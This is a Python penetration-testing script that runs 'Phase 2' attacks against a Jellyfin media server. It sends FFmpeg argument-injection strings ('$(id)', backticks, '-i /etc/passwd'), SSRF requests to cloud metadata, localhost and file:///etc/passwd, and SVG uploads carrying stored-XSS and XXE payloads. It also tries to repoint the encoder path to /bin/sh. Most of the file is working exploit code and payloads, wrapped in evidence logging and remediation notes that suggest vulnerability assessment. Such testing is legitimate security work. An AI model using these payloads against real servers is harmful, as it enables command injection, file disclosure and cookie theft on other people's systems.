#!/usr/bin/env python3
"""
COBALT STRIKE II -- Phase 2: FFmpeg Argument Injection Testing
Tests EncodingHelper.GetUserAgentParam() and GetRefererParam() which use
direct string concatenation without escaping (lines 493-516).

Also tests container/codec validation regex bypass and subtitle path injection.

Prior CVEs in this code path:
  CVE-2023-49096 (HIGH): Argument injection in FFmpeg codec parameters
  CVE-2025-31499 (HIGH): FFmpeg argument injection bypass of prior patch
  CVE-2023-48702 (MEDIUM): RCE via custom FFmpeg binary path
"""

import sys
sys.path.insert(0, '/home/[REDACTED]/Desktop/[REDACTED-PATH]/JellyFin/scripts')

from jellyfin_common import *
import urllib.parse

banner("Phase 2: FFmpeg Argument Injection Testing")

ec = EvidenceCollector("phase2_ffmpeg_injection", phase="phase2")
js = JellyfinSession()

if not js.test_connection():
    print("[-] Cannot connect to Jellyfin")
    sys.exit(1)

# Get media items for testing
print("\n[*] Getting library items for transcoding tests...\n")

resp = js.get("/Items", params={
    "Recursive": "true",
    "IncludeItemTypes": "Movie,Audio,Video",
    "Fields": "Path,MediaSources",
})
items = resp.json().get("Items", []) if resp.status_code == 200 else []

movie_id = None
audio_id = None
for item in items:
    if item["Type"] == "Movie" and not movie_id:
        movie_id = item["Id"]
        movie_source = item.get("MediaSources", [{}])[0].get("Id", movie_id)
        print(f"  Movie: {item['Name']} (ID: {movie_id})")
    elif item["Type"] == "Audio" and not audio_id:
        audio_id = item["Id"]
        audio_source = item.get("MediaSources", [{}])[0].get("Id", audio_id)
        print(f"  Audio: {item['Name']} (ID: {audio_id})")

if not movie_id:
    print("[-] No movie item found for testing")
    sys.exit(1)


# ===========================================================================
# TEST 1: FFmpeg argument injection via streaming parameters
# ===========================================================================

print("\n" + "=" * 60)
print("  TEST 1: FFmpeg Streaming Parameter Injection")
print("=" * 60)

# The streaming endpoints accept various parameters that flow into FFmpeg
# command construction. Key parameters to test:
#   - VideoCodec, AudioCodec (validated by ContainerValidationRegex)
#   - Container (validated by ContainerValidationRegex)
#   - SubtitleCodec
#   - Various filter parameters

# ContainerValidationRegex = @"^[a-zA-Z0-9\-\._,|]{0,40}$"
# Note: This allows pipe | which is meaningful in FFmpeg

print("\n[*] Step 1a: Testing container/codec validation regex bypass...\n")

codec_payloads = [
    # Pipe character (allowed by regex, meaningful in FFmpeg)
    {"param": "VideoCodec", "value": "h264|h265", "desc": "Pipe-delimited codec"},
    {"param": "VideoCodec", "value": "h264,h265", "desc": "Comma-delimited codec"},
    {"param": "AudioCodec", "value": "aac|mp3", "desc": "Pipe-delimited audio codec"},
    {"param": "Container", "value": "mp4|mkv", "desc": "Pipe-delimited container"},
    # Test regex boundary (40 char limit)
    {"param": "VideoCodec", "value": "a" * 41, "desc": "Codec exceeding 40 char limit"},
    {"param": "VideoCodec", "value": "h264;id", "desc": "Semicolon injection attempt"},
    {"param": "VideoCodec", "value": "h264 -v", "desc": "Space injection attempt"},
    {"param": "VideoCodec", "value": "h264\n-v", "desc": "Newline injection attempt"},
    # Test characters not in regex
    {"param": "Container", "value": "mp4$(id)", "desc": "Shell command injection in container"},
    {"param": "Container", "value": "mp4`id`", "desc": "Backtick injection in container"},
]

for payload in codec_payloads:
    try:
        params = {
            "static": "true",
            "MediaSourceId": movie_source,
            payload["param"]: payload["value"],
        }

        url = f"/Videos/{movie_id}/stream.mp4"
        resp = js.get(url, params=params)
        status = resp.status_code

        # 200 = accepted and streaming, 400 = validation rejected,
        # 500 = server error (possible injection reaching FFmpeg)
        result = "PASS"
        if status == 200:
            result = "ANOMALOUS"
            print(f"  [!] ACCEPTED: {payload['desc']} ({payload['param']}={payload['value'][:30]})")
        elif status == 500:
            result = "ANOMALOUS"
            error_text = resp.text[:200]
            print(f"  [?] 500 ERROR: {payload['desc']} -- {error_text[:80]}")
        elif status in (400, 404):
            print(f"  [+] Rejected: {payload['desc']} -- HTTP {status}")
        else:
            print(f"  [-] HTTP {status}: {payload['desc']}")

        ec.add_test(
            f"CODEC-{payload['param']}-{payload['desc'][:20]}",
            f"Codec injection: {payload['desc']}",
            f"GET /Videos/{movie_id}/stream.mp4?{payload['param']}={payload['value'][:50]}",
            f"HTTP {status}: {resp.text[:200] if status >= 400 else 'stream data'}",
            result=result,
        )

        rate_limit(0.3)
    except Exception as e:
        print(f"  [!] Error: {payload['desc']} -- {e}")


# ===========================================================================
# TEST 2: PlaybackInfo endpoint -- parameter injection
# ===========================================================================

print("\n" + "=" * 60)
print("  TEST 2: PlaybackInfo Parameter Injection")
print("=" * 60)

# PlaybackInfo is where device profiles and transcoding params are set
# This is the entry point that populates EncodingJobInfo

print("\n[*] Step 2a: Testing PlaybackInfo with injection payloads...\n")

playback_payloads = [
    {
        "desc": "Normal playback info request",
        "body": {
            "DeviceProfile": {
                "MaxStreamingBitrate": 8000000,
                "MaxStaticBitrate": 8000000,
                "MusicStreamingTranscodingBitrate": 128000,
                "DirectPlayProfiles": [
                    {"Container": "mp4", "Type": "Video", "VideoCodec": "h264", "AudioCodec": "aac"}
                ],
                "TranscodingProfiles": [
                    {"Container": "ts", "Type": "Video", "VideoCodec": "h264", "AudioCodec": "aac",
                     "Context": "Streaming", "Protocol": "hls"}
                ],
            }
        },
    },
    {
        "desc": "Injection in TranscodingProfile container",
        "body": {
            "DeviceProfile": {
                "TranscodingProfiles": [
                    {"Container": "ts\" -f lavfi -i color", "Type": "Video", "VideoCodec": "h264",
                     "AudioCodec": "aac", "Context": "Streaming", "Protocol": "hls"}
                ],
            }
        },
    },
    {
        "desc": "Injection in DirectPlayProfile VideoCodec",
        "body": {
            "DeviceProfile": {
                "DirectPlayProfiles": [
                    {"Container": "mp4", "Type": "Video",
                     "VideoCodec": 'h264" -f null /dev/null -i "',
                     "AudioCodec": "aac"}
                ],
            }
        },
    },
    {
        "desc": "SubtitleProfile with path injection",
        "body": {
            "DeviceProfile": {
                "SubtitleProfiles": [
                    {"Format": "srt", "Method": "External"},
                    {"Format": "srt\n-i /etc/passwd", "Method": "Embed"},
                ],
                "DirectPlayProfiles": [
                    {"Container": "mp4", "Type": "Video"}
                ],
            }
        },
    },
]

for payload in playback_payloads:
    try:
        resp = js.post(f"/Items/{movie_id}/PlaybackInfo",
                      data=payload["body"])
        status = resp.status_code
        text = resp.text[:500]

        if status == 200:
            try:
                data = resp.json()
                media_sources = data.get("MediaSources", [])
                play_session = data.get("PlaySessionId", "")
                print(f"  [+] {payload['desc']}: 200 OK (session: {play_session[:10]})")
                for ms in media_sources:
                    tc = ms.get("TranscodingUrl", "none")
                    if tc != "none":
                        print(f"      TranscodingUrl: {tc[:120]}")
                        # Check if injection payload appears in transcoding URL
                        if "lavfi" in tc or "/etc/passwd" in tc or "null" in tc.lower():
                            print(f"      [!!!] INJECTION DETECTED IN TRANSCODING URL!")
                            ec.add_finding(
                                f"FFMPEG-INJECT-{payload['desc'][:20]}",
                                "CRITICAL",
                                f"FFmpeg injection via PlaybackInfo: {payload['desc']}",
                                f"Payload appeared in TranscodingUrl: {tc}",
                                evidence=tc,
                            )
            except:
                print(f"  [+] {payload['desc']}: 200 OK (non-JSON)")
        else:
            print(f"  [-] {payload['desc']}: HTTP {status} -- {text[:100]}")

        ec.add_test(
            f"PLAYBACK-{payload['desc'][:25]}",
            f"PlaybackInfo: {payload['desc']}",
            f"POST /Items/{movie_id}/PlaybackInfo",
            f"HTTP {status}: {text[:300]}",
            result="ANOMALOUS" if status == 200 and "lavfi" in text else "PASS",
        )

        rate_limit(0.3)
    except Exception as e:
        print(f"  [!] Error: {e}")


# ===========================================================================
# TEST 3: Direct stream with RemoteHttpHeaders manipulation
# ===========================================================================

print("\n" + "=" * 60)
print("  TEST 3: RemoteHttpHeaders User-Agent/Referer Injection")
print("=" * 60)

# EncodingHelper.GetUserAgentParam: "-user_agent \"" + useragent + "\""
# EncodingHelper.GetRefererParam:   "-referer \"" + referer + "\""
# These are called when transcoding remote media sources.
# The injection requires the media source to have RemoteHttpHeaders set.

# We can test this by:
# 1. Creating a media source with RemoteHttpHeaders containing injection payloads
# 2. Requesting transcoding of that source
# 3. Checking if FFmpeg receives the injected arguments

# First, check if we can provide RemoteHttpHeaders via PlaybackInfo
print("\n[*] Step 3a: Testing header injection via streaming parameters...\n")

# The streaming endpoints accept various query parameters that affect transcoding
# Let's check if there's a way to set headers via the API

# Try to trigger transcoding with specific parameters that force FFmpeg invocation
transcode_params = {
    "static": "false",
    "MediaSourceId": movie_source,
    "VideoCodec": "h264",
    "AudioCodec": "aac",
    "Container": "ts",
    "TranscodingProtocol": "hls",
    "MaxStreamingBitrate": "1000000",
    "SegmentContainer": "ts",
    "MinSegments": "1",
    "BreakOnNonKeyFrames": "true",
}

# Request transcoding to trigger FFmpeg
resp = js.get(f"/Videos/{movie_id}/master.m3u8", params=transcode_params)
print(f"  HLS master playlist: HTTP {resp.status_code}")
if resp.status_code == 200:
    print(f"  Content: {resp.text[:300]}")
    ec.add_test("TRANSCODE-HLS", "HLS transcoding request",
               f"GET /Videos/{movie_id}/master.m3u8",
               f"HTTP {resp.status_code}: {resp.text[:200]}", result="PASS")

# Check if FFmpeg process was started and what arguments it got
rate_limit(1)

# Check the transcoding job
resp = js.get("/Sessions")
if resp.status_code == 200:
    sessions = resp.json()
    for session in sessions:
        transcode_info = session.get("TranscodingInfo", {})
        if transcode_info:
            print(f"\n  Active transcoding:")
            print(f"    VideoCodec: {transcode_info.get('VideoCodec', '?')}")
            print(f"    AudioCodec: {transcode_info.get('AudioCodec', '?')}")
            print(f"    Container: {transcode_info.get('Container', '?')}")
            print(f"    IsVideoDirect: {transcode_info.get('IsVideoDirect', '?')}")


# ===========================================================================
# TEST 4: SSRF via Remote Image endpoints
# ===========================================================================

print("\n\n" + "=" * 60)
print("  TEST 4: SSRF via Remote Image Endpoints")
print("=" * 60)

print("\n[*] Step 4a: Testing remote image fetching...\n")

ssrf_targets = [
    ("localhost_api", "http://127.0.0.1:8096/System/Info/Public"),
    ("cloud_metadata", "http://[REDACTED-IP]/latest/meta-data/"),
    ("internal_docker", "http://[REDACTED-INTERNAL-IP]:8096/System/Info/Public"),
    ("file_scheme", "file:///etc/passwd"),
    ("callback_test", "http://127.0.0.1:8096/Branding/Css"),
]

for target_name, target_url in ssrf_targets:
    try:
        # Test unauthenticated first
        resp_unauth = js.raw_get(f"/Images/Remote?imageUrl={urllib.parse.quote(target_url)}")
        # Test authenticated
        resp_auth = js.get(f"/Images/Remote", params={"imageUrl": target_url})

        unauth_code = resp_unauth.status_code
        auth_code = resp_auth.status_code

        is_vuln = False
        if unauth_code == 200:
            is_vuln = True
            print(f"  [!!] {target_name}: UNAUTH SSRF -- HTTP {unauth_code} "
                  f"(Content-Type: {resp_unauth.headers.get('Content-Type', '?')}, "
                  f"Size: {len(resp_unauth.content)} bytes)")
        elif auth_code == 200:
            is_vuln = True
            print(f"  [!] {target_name}: AUTH SSRF -- HTTP {auth_code} "
                  f"(Content-Type: {resp_auth.headers.get('Content-Type', '?')}, "
                  f"Size: {len(resp_auth.content)} bytes)")
        elif auth_code == 404 and unauth_code == 404:
            print(f"  [+] {target_name}: Not found (endpoint may not exist)")
        else:
            print(f"  [-] {target_name}: unauth={unauth_code} auth={auth_code}")

        if is_vuln:
            severity = "HIGH" if unauth_code == 200 else "MEDIUM"
            ec.add_finding(
                f"SSRF-{target_name}",
                severity,
                f"SSRF via /Images/Remote: {target_name}",
                f"imageUrl={target_url} returned HTTP 200 with {len(resp_auth.content)} bytes. "
                f"Unauthenticated: {unauth_code == 200}",
                evidence=f"URL: {target_url}\nResponse size: {len(resp_auth.content)} bytes",
                remediation="Validate URLs against a denylist of internal/private IP ranges "
                           "and restrict URL schemes to http/https only.",
            )

        ec.add_test(
            f"SSRF-{target_name}",
            f"SSRF test: {target_name}",
            f"GET /Images/Remote?imageUrl={target_url[:60]}",
            f"Unauth: {unauth_code}, Auth: {auth_code}",
            result="VULN" if is_vuln else "PASS",
        )

        rate_limit(0.3)
    except Exception as e:
        print(f"  [!] Error: {target_name} -- {e}")


# Also test Items/RemoteSearch/Image (another SSRF vector from CVE-2021-29490)
print("\n[*] Step 4b: Testing /Items/RemoteSearch/Image...\n")

for target_name, target_url in ssrf_targets[:3]:
    try:
        resp = js.get(f"/Items/RemoteSearch/Image",
                     params={"ImageUrl": target_url, "ProviderName": "TheMovieDb"})
        print(f"  {target_name}: HTTP {resp.status_code}")
        if resp.status_code == 200:
            print(f"    Size: {len(resp.content)} bytes, "
                  f"Content-Type: {resp.headers.get('Content-Type', '?')}")
        rate_limit(0.3)
    except Exception as e:
        print(f"  [!] Error: {e}")


# ===========================================================================
# TEST 5: Missing Security Headers Analysis
# ===========================================================================

print("\n\n" + "=" * 60)
print("  TEST 5: Security Headers Analysis")
print("=" * 60)

print("\n[*] Checking response headers on multiple endpoints...\n")

header_checks = [
    ("/", "Root page"),
    ("/web/index.html", "Web UI"),
    ("/System/Info/Public", "Public API"),
    ("/api-docs/swagger", "Swagger UI"),
]

expected_headers = [
    "Content-Security-Policy",
    "X-Content-Type-Options",
    "X-Frame-Options",
    "Strict-Transport-Security",
    "X-XSS-Protection",
    "Referrer-Policy",
    "Permissions-Policy",
    "Cross-Origin-Opener-Policy",
    "Cross-Origin-Embedder-Policy",
]

missing_headers_all = set()

for endpoint, desc in header_checks:
    resp = js.raw_get(endpoint)
    missing = [h for h in expected_headers if h not in resp.headers]
    present = [h for h in expected_headers if h in resp.headers]
    missing_headers_all.update(missing)

    print(f"  {endpoint}:")
    for h in expected_headers:
        val = resp.headers.get(h, "MISSING")
        marker = "  " if val != "MISSING" else "!!"
        print(f"    [{marker}] {h}: {val}")

if missing_headers_all:
    ec.add_finding(
        "HEADERS-MISSING",
        "MEDIUM",
        f"Missing {len(missing_headers_all)} security response headers",
        f"Jellyfin does not set standard security headers. "
        f"Missing: {', '.join(sorted(missing_headers_all))}. "
        f"This affects all 66,757 internet-facing instances and reduces "
        f"defense-in-depth against XSS, clickjacking, and MIME-type confusion.",
        remediation=(
            "Add the following headers via ASP.NET Core middleware:\n"
            "  Content-Security-Policy: default-src 'self'; script-src 'self'\n"
            "  X-Content-Type-Options: nosniff\n"
            "  X-Frame-Options: DENY\n"
            "  Referrer-Policy: strict-origin-when-cross-origin\n"
            "  Permissions-Policy: camera=(), microphone=(), geolocation=()"
        ),
    )


# ===========================================================================
# TEST 6: Unauthenticated endpoint testing (expanded)
# ===========================================================================

print("\n\n" + "=" * 60)
print("  TEST 6: Expanded Unauthenticated Access Testing")
print("=" * 60)

# From OpenAPI spec, 59 endpoints have no security requirement
# Most are media streaming/image endpoints -- test key ones

print("\n[*] Testing unauthenticated endpoints for information disclosure...\n")

unauth_endpoints = [
    ("GET", "/Users/Public", "Public user list"),
    ("GET", "/Branding/Configuration", "Branding config"),
    ("GET", "/Branding/Splashscreen", "Splash screen image"),
    ("GET", "/QuickConnect/Enabled", "Quick Connect status"),
    ("GET", "/web/ConfigurationPage", "Configuration page"),
    ("POST", "/Users/ForgotPassword", "Password reset"),
    ("GET", f"/Items/{movie_id}/Images/Primary", "Item image (no auth)"),
    ("GET", f"/Videos/{movie_id}/stream.mp4?static=true", "Static video stream (no auth)"),
    ("GET", f"/Audio/{audio_id}/stream.mp3?static=true" if audio_id else "/skip", "Static audio stream (no auth)"),
]

for method, endpoint, desc in unauth_endpoints:
    if endpoint == "/skip":
        continue
    try:
        if method == "GET":
            resp = js.raw_get(endpoint)
        else:
            resp = js.raw_post(endpoint, data={})

        status = resp.status_code
        size = len(resp.content)
        ctype = resp.headers.get("Content-Type", "?")

        if status == 200:
            if size > 100:
                print(f"  [!] {method} {endpoint[:60]}: {status} ({size} bytes, {ctype})")
            else:
                print(f"  [+] {method} {endpoint[:60]}: {status} ({size} bytes)")
        else:
            print(f"  [-] {method} {endpoint[:60]}: {status}")

        is_sensitive = status == 200 and endpoint not in [
            "/Branding/Configuration", "/Branding/Splashscreen",
            "/QuickConnect/Enabled", "/web/ConfigurationPage",
        ]

        ec.add_test(
            f"UNAUTH-{endpoint.split('?')[0].replace('/', '-')[1:][:25]}",
            f"Unauth access: {desc}",
            f"{method} {endpoint[:60]}",
            f"HTTP {status}: {size} bytes, {ctype}",
            result="VULN" if is_sensitive and status == 200 else "PASS",
        )

        rate_limit(0.2)
    except Exception as e:
        print(f"  [!] Error: {e}")


# ===========================================================================
# TEST 7: SVG Upload for XSS (CVE-2024-43801 regression)
# ===========================================================================

print("\n\n" + "=" * 60)
print("  TEST 7: SVG Upload XSS Testing (CVE-2024-43801)")
print("=" * 60)

print("\n[*] Step 7a: Testing SVG upload to user profile image...\n")

svg_payloads = [
    {
        "name": "basic_xss",
        "content": '<?xml version="1.0" encoding="UTF-8"?>\n'
                   '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">\n'
                   '<script>alert("XSS")</script>\n'
                   '<circle cx="50" cy="50" r="40" fill="red"/>\n'
                   '</svg>',
        "desc": "SVG with <script> tag",
    },
    {
        "name": "event_handler",
        "content": '<?xml version="1.0" encoding="UTF-8"?>\n'
                   '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">\n'
                   '<rect width="100" height="100" onload="alert(document.cookie)"/>\n'
                   '</svg>',
        "desc": "SVG with onload event handler",
    },
    {
        "name": "xxe_attempt",
        "content": '<?xml version="1.0" encoding="UTF-8"?>\n'
                   '<!DOCTYPE svg [\n'
                   '  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n'
                   ']>\n'
                   '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">\n'
                   '<text x="10" y="50">&xxe;</text>\n'
                   '</svg>',
        "desc": "SVG with XXE entity",
    },
    {
        "name": "external_image",
        "content": '<?xml version="1.0" encoding="UTF-8"?>\n'
                   '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" '
                   'viewBox="0 0 100 100">\n'
                   '<image xlink:href="http://127.0.0.1:8096/System/Info/Public" width="100" height="100"/>\n'
                   '</svg>',
        "desc": "SVG with external image reference (SSRF)",
    },
]

user_id = js.user_id

for payload in svg_payloads:
    try:
        svg_bytes = payload["content"].encode("utf-8")

        # Upload as profile image
        headers = {"X-Emby-Authorization": js._auth_header()}
        resp = js.session.post(
            f"{js.base_url}/UserImage",
            headers={**headers, "Content-Type": "image/svg+xml"},
            data=svg_bytes,
            timeout=30,
        )
        status = resp.status_code
        text = resp.text[:300]

        if status in (200, 204):
            print(f"  [!] SVG uploaded: {payload['name']} -- {payload['desc']}")

            # Now fetch the image back and check if XSS payload is preserved
            img_resp = js.raw_get(f"/Users/{user_id}/Images/Profile")
            if img_resp.status_code == 200:
                img_ctype = img_resp.headers.get("Content-Type", "?")
                img_content = img_resp.text[:500]

                has_script = "<script>" in img_content.lower()
                has_event = "onload=" in img_content.lower()
                has_xxe = "root:" in img_content

                if has_script or has_event:
                    print(f"    [!!] XSS payload PRESERVED in profile image!")
                    print(f"    Content-Type: {img_ctype}")
                    print(f"    XSS in content: script={has_script}, event={has_event}")

                    ec.add_finding(
                        f"SVG-XSS-{payload['name']}",
                        "HIGH" if "image/svg" in img_ctype else "MEDIUM",
                        f"Stored XSS via SVG profile image: {payload['desc']}",
                        f"SVG with XSS payload uploaded and served back with "
                        f"Content-Type: {img_ctype}. Payload preserved: "
                        f"script={has_script}, event={has_event}.",
                        evidence=img_content[:500],
                    )
                elif has_xxe:
                    print(f"    [!!] XXE payload extracted /etc/passwd!")
                    ec.add_finding(
                        f"SVG-XXE-{payload['name']}", "CRITICAL",
                        "XXE via SVG profile image upload",
                        f"SVG XXE extracted file content",
                        evidence=img_content[:500],
                    )
                else:
                    print(f"    Content-Type: {img_ctype}, Size: {len(img_resp.content)} bytes")
                    print(f"    Payload stripped/sanitized: no XSS in output")

            # Clean up -- delete the profile image
            del_resp = js.delete(f"/UserImage")
            if del_resp.status_code in (200, 204):
                print(f"    Cleaned up profile image")
        elif status == 400:
            print(f"  [+] Rejected: {payload['name']} -- {text[:80]}")
        elif status == 403:
            print(f"  [-] Forbidden: {payload['name']}")
        else:
            print(f"  [-] HTTP {status}: {payload['name']} -- {text[:80]}")

        ec.add_test(
            f"SVG-{payload['name']}",
            f"SVG upload: {payload['desc'][:40]}",
            f"POST /UserImage (Content-Type: image/svg+xml)",
            f"HTTP {status}: {text[:200]}",
            result="VULN" if status in (200, 204) else "PASS",
        )

        rate_limit(0.3)
    except Exception as e:
        print(f"  [!] Error: {payload['name']} -- {e}")


# ===========================================================================
# TEST 8: Encoder Path Check (CVE-2023-48702 regression)
# ===========================================================================

print("\n\n" + "=" * 60)
print("  TEST 8: Encoder Path RCE (CVE-2023-48702 Regression)")
print("=" * 60)

print("\n[*] Testing /System/MediaEncoder/Path endpoint...\n")

# CVE-2023-48702: Setting FFmpeg path to a malicious binary
# Should be patched -- the endpoint should be restricted or removed

# Check if the endpoint exists and what it returns
resp = js.get("/System/MediaEncoder/Path")
print(f"  GET /System/MediaEncoder/Path: HTTP {resp.status_code}")
if resp.status_code == 200:
    print(f"    Response: {resp.text[:200]}")

# Try to set the encoder path (this should be blocked)
for malicious_path in ["/tmp/evil_ffmpeg", "/bin/sh", "$(id)"]:
    resp = js.post("/System/MediaEncoder/Path",
                  data={"Path": malicious_path, "PathType": "Custom"})
    status = resp.status_code
    print(f"  POST Path={malicious_path}: HTTP {status}")

    ec.add_test(
        f"ENCODER-PATH-{malicious_path[:15]}",
        f"Encoder path set: {malicious_path}",
        f"POST /System/MediaEncoder/Path",
        f"HTTP {status}: {resp.text[:200]}",
        result="VULN" if status in (200, 204) else "PASS",
    )
    rate_limit(0.2)


# ===========================================================================
# SUMMARY
# ===========================================================================

print("\n\n" + "=" * 60)
print("  PHASE 2 SUMMARY")
print("=" * 60)

ec.save()
